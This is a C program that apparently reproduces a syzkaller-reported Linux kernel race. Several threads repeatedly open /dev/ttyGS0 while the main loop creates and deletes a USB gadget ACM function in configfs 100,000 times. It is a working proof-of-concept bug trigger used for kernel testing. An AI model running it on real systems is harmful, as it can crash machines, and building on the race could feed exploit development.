// https://syzkaller.appspot.com/bug?id=69b71bf98ada6c6ec45657617e1b8ccf6b890a51
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mount.h>
#include <errno.h>

void *opener_thread(void *arg) {
    while (1) {
        int fd = open("/dev/ttyGS0", O_RDWR);
        if (fd >= 0) {
            close(fd);
        }
    }
    return NULL;
}

int main() {
    struct stat st;
    if (stat("/sys/kernel/config", &st) < 0) {
        mkdir("/sys/kernel/config", 0755);
    }
    if (stat("/sys/kernel/config/usb_gadget", &st) < 0) {
        if (mount("none", "/sys/kernel/config", "configfs", 0, NULL) < 0) {
            printf("[-] mount configfs failed: %s\n", strerror(errno));
            return 1;
        }
    }

    if (mkdir("/sys/kernel/config/usb_gadget/g1", 0755) < 0 && errno != EEXIST) {
        printf("[-] mkdir g1 failed: %s\n", strerror(errno));
        return 1;
    }

    // Test if acm function is available
    if (mkdir("/sys/kernel/config/usb_gadget/g1/functions/acm.usb0", 0755) < 0) {
        printf("[-] mkdir acm.usb0 failed: %s\n", strerror(errno));
        return 1;
    }
    rmdir("/sys/kernel/config/usb_gadget/g1/functions/acm.usb0");

    printf("[+] Environment ready, starting race...\n");

    pthread_t th[4];
    for (int i = 0; i < 4; i++) {
        pthread_create(&th[i], NULL, opener_thread, NULL);
    }

    int count = 0;
    while (count < 100000) {
        mkdir("/sys/kernel/config/usb_gadget/g1/functions/acm.usb0", 0755);
        usleep(100);
        rmdir("/sys/kernel/config/usb_gadget/g1/functions/acm.usb0");
        count++;
    }

    printf("[+] Race finished without crash.\n");
    return 0;
}
